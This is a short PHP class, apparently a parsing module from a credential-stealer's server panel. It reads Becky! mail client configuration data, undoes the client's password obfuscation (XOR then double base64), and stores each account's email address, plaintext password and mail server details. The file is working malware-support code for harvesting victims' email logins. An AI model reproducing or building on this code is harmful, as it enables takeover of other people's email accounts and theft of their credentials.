<?php
class Module_becky extends Module_
{
	private function Decode($Password)
	{
		$DECPW_ = '';
		for ($i = 0; $i < strlen($Password); $i++)
		{
			$DECPW_ .= chr(ord($Password[$i]) ^ 2);
		}
		
		return base64_decode(base64_decode($DECPW_));
	}
	
    function ProcessData($Source)
    {
		if (!strlen($Source))
			return;

		$Sections = parse_ini($Source);
		foreach ($Sections as $Section)
		{
			if (!is_array($Section))
				continue;

			$User 		= Assign_($Section['UserID']);
			$Pass 		= $this->Decode(Assign_($Section['PassWd']));
			$Email 		= Assign_($Section['MailAddress']);
			$Prot 		= Assign_($Section['Protocol']);
			
			$MailServer = Assign_($Section['MailServer']);
			$SMTPServer = Assign_($Section['SMTPServer']);
			$SMTPPort 	= Assign_($Section['SMTPPort']);
			
			if ($Prot == '1')
			{
				$MailPort = Assign_($Section['IMAP4Port']);
				$Prot = 'imap';
			} 
			else
			{
				$MailPort = Assign_($Section['POP3Port']);
				$Prot = 'pop3';
			}
			
			$this->add_email($Email, 'smtp', $SMTPServer, $SMTPPort, $User, $Pass);
			$this->add_email($Email, $Prot, $MailServer, $MailPort, $User, $Pass);
		}
		
		$Sections = NULL;
    }
	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessData($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

